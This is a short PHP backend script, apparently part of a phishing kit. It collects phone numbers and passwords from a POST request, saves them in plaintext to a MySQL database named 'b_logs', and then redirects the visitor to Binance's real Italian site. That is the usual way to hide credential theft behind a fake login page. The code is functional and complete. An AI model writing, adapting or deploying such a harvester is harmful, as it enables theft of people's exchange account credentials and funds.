<?php
// Configurazione database
$host = 'localhost';
$db   = 'b_logs'; // Cambia con il nome del tuo database
$user = 'root'; // Cambia con il tuo username
$pass = '';     // Cambia con la tua password
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

header('Content-Type: application/json');

// Ricevi i dati dal POST
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : null;
$password = isset($_POST['password']) ? trim($_POST['password']) : null;
$id = isset($_POST['id']) ? intval($_POST['id']) : null;

// if ($phone && !$password) {
//     // Primo step: salva solo il telefono
//     $stmt = $pdo->prepare('INSERT INTO users (phone) VALUES (?)');
//     if ($stmt->execute([$phone])) {
//         echo json_encode(['success' => true, 'id' => $pdo->lastInsertId()]);
//     } else {
//         http_response_code(500);
//         echo json_encode(['error' => 'Failed to save phone number']);
//     }
//     exit;
// }

if ($phone && $password) {
    // Inserisce sia telefono che password in una nuova riga
    $stmt = $pdo->prepare('INSERT INTO users (phone, password) VALUES (?, ?)');
    if ($stmt->execute([$phone, $password])) {
        echo json_encode(['success' => true, 'id' => $pdo->lastInsertId()]);
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to save phone and password']);
    }
    header("Location: https://www.binance.com/it");
    exit;
}

http_response_code(400);
echo json_encode(['error' => 'Invalid request']); 